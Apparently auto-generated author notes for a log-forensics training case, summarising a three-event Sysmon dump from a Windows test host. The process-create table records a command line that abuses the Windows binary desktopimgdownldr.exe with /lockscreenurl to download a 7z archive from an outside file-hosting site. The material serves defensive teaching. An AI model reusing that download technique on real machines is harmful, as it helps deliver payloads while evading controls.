# Author notes: 14-nothing-was-installed

Private to the case author. The app never shows this file. It lists mechanical facts about the data to help you write the brief, hints and answer key. It is **not** an analysis: decide yourself what matters.

Generated 2026-10-17T00:16:50Z by `tools/case.py survey`.

## Sources

| Case file | From | Format | Events | SHA-256 |
|---|---|---|---|---|
| `data/case14-sysmon.jsonl` | sysmon_11_1_lolbas_downldr_desktopimgdownldr.evtx | EVTX (chainsaw dump) | 3 | `f63ea09964ad…` |

## Counts

| Channel | Event ID | Label | Count |
|---|---|---|---|
| Microsoft-Windows-Sysmon/Operational | 1 | Process create | 2 |
| Microsoft-Windows-Sysmon/Operational | 11 | File create | 1 |

- **Events:** 3
- **Hosts:** `MSEDGEWIN10` (3)
- **Users:** `MSEDGEWIN10\IEUser` (2)

## Time and record IDs per channel

| Channel | First (UTC) | Last (UTC) | Record IDs | Missing |
|---|---|---|---|---|
| Microsoft-Windows-Sysmon/Operational | 2020-07-03 08:47:20.001 | 2020-07-03 08:47:21.485 | 305352–305356 | 305353, 305355 |

Record order vs time order: 0 place(s) where a later event has a lower record ID within its channel.

## Process-create style events (time order)

| Time | Ref | Image | ProcessGuid | ParentProcessGuid | Parent image | Command line |
|---|---|---|---|---|---|---|
| 2020-07-03 08:47:20.001 | rec 305352 | `C:\Windows\System32\cmd.exe` | `747F3D96-F098-5EFE-0000-001012E13801` | `747F3D96-EF3D-5EFE-0000-0010F3653401` (no process-create event) | `C:\Windows\System32\cmd.exe` | `cmd  /c desktopimgdownldr.exe /lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr ` |
| 2020-07-03 08:47:20.055 | rec 305354 | `C:\Windows\System32\desktopimgdownldr.exe` | `747F3D96-F098-5EFE-0000-001090E33801` | `747F3D96-F098-5EFE-0000-001012E13801` | `C:\Windows\System32\cmd.exe` | `desktopimgdownldr.exe  /lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr ` |
